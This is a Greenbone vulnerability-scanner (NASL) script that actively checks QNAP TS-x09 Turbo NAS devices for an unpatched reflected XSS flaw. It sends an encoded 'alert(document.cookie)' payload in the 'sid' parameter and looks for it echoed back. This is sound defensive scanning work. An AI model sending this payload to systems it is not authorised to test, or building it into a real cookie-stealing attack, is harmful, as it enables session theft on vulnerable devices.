# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:qnap:qts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805694");
  script_version("2023-09-27T05:05:31+0000");
  script_tag(name:"last_modification", value:"2023-09-27 05:05:31 +0000 (Wed, 27 Sep 2023)");
  script_tag(name:"creation_date", value:"2015-07-28 11:38:53 +0530 (Tue, 28 Jul 2015)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("QNAP TS_x09 Turbo NAS Devices XSS Vulnerability (Jul 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_qnap_nas_http_detect.nasl");
  script_mandatory_keys("qnap/nas/http/detected");
  script_require_ports("Services/www", 8080);

  script_tag(name:"summary", value:"QNAP TS-x09 Turbo NAS devices are prone to a reflected
  cross-site scripting (XSS) vulnerability.");

  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'sid' variable in
  'cgi-bin/user_index.cgi' and 'cgi-bin/index.cgi' is not properly sanitized.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote unauthenticated
  attacker to inject arbitrary JavaScript which is executed server-side by escaping from the
  quotation marks.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"QNAP devices, TS-109 PRO and TS-109 II Version 3.3.0 Build
  0924T, TS-209 and TS-209 PRO II Version 3.3.3 Build 1003T, TS-409 and TS-409U Version 3.3.2 Build
  0918T.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.mogozobo.com/?p=2574");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132840");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jul/115");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if ( ! port = get_app_port( cpe:CPE, service: "www" ) )
  exit( 0 );

if ( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

# Since the VT refers to certain models only, we first check if the registered model
# is in the list of known affected models
if ( ! model = get_kb_item( "qnap/nas/model" ) )
  exit( 0 );

if ( model !~ "TS\-[1-9]09*" )
  exit( 0 );

if ( dir == "/" )
  dir = "";

url = dir + "/user_index.cgi?sid=%22%3balert%28document.cookie%29%2f%2f";

if ( http_vuln_check( port:port, url:url, pattern:"alert\(document\.cookie\)",
                      extra_check:"QNAP Turbo NAS", check_header:TRUE ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
